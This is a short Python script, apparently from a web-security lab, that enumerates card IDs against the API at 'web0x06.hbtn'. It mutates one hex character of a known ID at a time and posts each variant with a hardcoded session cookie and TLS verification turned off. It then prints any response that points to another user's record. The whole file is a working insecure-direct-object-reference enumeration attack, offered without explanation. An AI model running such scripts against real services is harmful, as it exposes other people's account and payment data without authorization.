import requests
import string

original_id = "1392cbce2ad845f89bfcd88041bf7a68"
url = "http://web0x06.hbtn/api/cards/info"
session_cookie = "ImrYJ0MZW0SRRPvpOg6PJLOx_yx6sanYLTK6V8QlsOY.mQRgQux_eQCOIPKE3NLE-biAUqc"

def mutate_id(id_str):
    mutations = []
    for i in range(len(id_str)):
        for c in string.hexdigits.lower():
            if c != id_str[i]:
                mutated = id_str[:i] + c + id_str[i+1:]
                mutations.append(mutated)
    return mutations

mutants = mutate_id(original_id)

for card_id in mutants:
    resp = requests.post(url,
        json={"cards_id": [card_id]},
        cookies={"session": session_cookie},
        headers={"Content-Type": "application/json"},
        verify=False
    )
    if '"message":[]' not in resp.text:
        print(f"[+] Possible valid or foreign ID: {card_id}")
        print(resp.text)
